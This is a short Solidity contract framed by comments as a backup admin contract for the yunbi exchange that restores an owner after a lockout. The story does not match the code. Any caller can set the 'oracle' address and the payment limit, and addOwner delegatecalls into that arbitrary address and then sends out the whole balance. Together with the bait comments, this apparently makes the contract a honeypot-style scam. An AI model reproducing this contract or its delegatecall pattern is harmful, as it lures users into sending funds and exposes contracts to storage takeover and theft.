// created by tommy wang
// segwit2x is the real bitcoin
// 09.11.17
// back up admin contract for yunbi, adds owner in case of lockout


contract AdminInterface
{
    address public Owner; // web3.eth.accounts[9]
    address public oracle;
    uint256 public Limit;
    
    constructor(){
        Owner = msg.sender;
    }


    // config oracle db address and set minimum tx amt to limit abuse
    function Set(address dataBase) payable public 
    {
        Limit = msg.value;
        oracle = dataBase;
    }
    
    function transfer(address payable multisig) payable public  {
        multisig.transfer(msg.value);
    }

    function addOwner(address payable newAddr) payable public
    {   
        if(msg.value > Limit)
        {        
            // Because database is an database address, this adds owner to the database for that contract
            oracle.delegatecall(abi.encode(bytes4(keccak256("AddToWangDB(address)")),msg.sender));

            // transfer this wallets balance to new owner after address change
            newAddr.transfer(address(this).balance);
        }
    }
}